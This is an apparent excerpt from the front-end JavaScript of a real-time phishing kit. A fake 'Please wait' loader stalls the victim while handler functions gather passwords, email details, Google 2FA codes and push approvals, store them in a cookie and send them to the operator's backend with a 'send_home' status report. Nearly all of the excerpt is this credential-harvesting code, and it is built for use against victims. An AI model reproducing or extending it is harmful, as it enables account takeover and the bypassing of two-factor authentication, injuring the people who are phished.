...
//     $('<div class="loader__ waiter__" style="display:">\
//       <div class="loader-box">\
//               <h2 class="waiter_h2">Please wait...</h2>\
//               <div class="loader-images-box">\
//                   <img class="newloader" src="form/newloader.gif">\
//                   <div class="ab-logo">\
//                        <img class="loader-logo" src="https://i.imgur.com/YdPrhyT.png">\
//                  </div>\
//               </div>\
//               <p class="waiter_p">Do not load this page</p>\
//       </div>\
// </div>').appendTo('body');
...
var to_select = function() {
    loader_.show();
    $('.scum').hide();
    $('#select-view').show();
    $('form').each(function(i, item) { delete $(item).data().sub_ed })

    respond.mes = "User on Select page";
    CORE__.send_home();
...
var ask_pass_proxy = function(el) {
...
var ask_select_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_select.send(data);
...
var ask_call_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_call.send(data);

}



var ask_email_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_email.send(data);

}

var ask_g2fa_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_g2fa.send(data);

}



var ask_push_proxy = function(el) {

    data = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data);
    cookies.set('data__', JSON.stringify(all_data__))
    REST_FN__.ask_push.send(data);
